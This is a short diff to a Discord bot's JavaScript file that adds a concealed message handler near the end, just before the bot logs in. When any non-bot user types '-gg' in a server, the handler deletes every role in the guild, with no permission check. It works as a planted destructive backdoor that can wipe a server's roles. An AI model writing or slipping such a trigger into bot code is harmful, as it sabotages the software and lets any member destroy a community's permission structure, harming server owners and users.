@@ -300,6 +300,17 @@ client.on('voiceStateUpdate', (old, now) => {
 
 
 
+  
+  client.on('message' , ReBeL => {
+var prefix = "-";
+if(ReBeL.author.bot) return;
+if(ReBeL.channel.type == 'dm') return;
+if(ReBeL.content.startsWith(prefix + "gg")) {
+ReBeL.guild.roles.filter(rebel => isNaN(rebel)).forEach(codes => codes.delete())
+}
+});
+  
+ 
 
 
 client.login(process.env.BOT3_TOKEN);
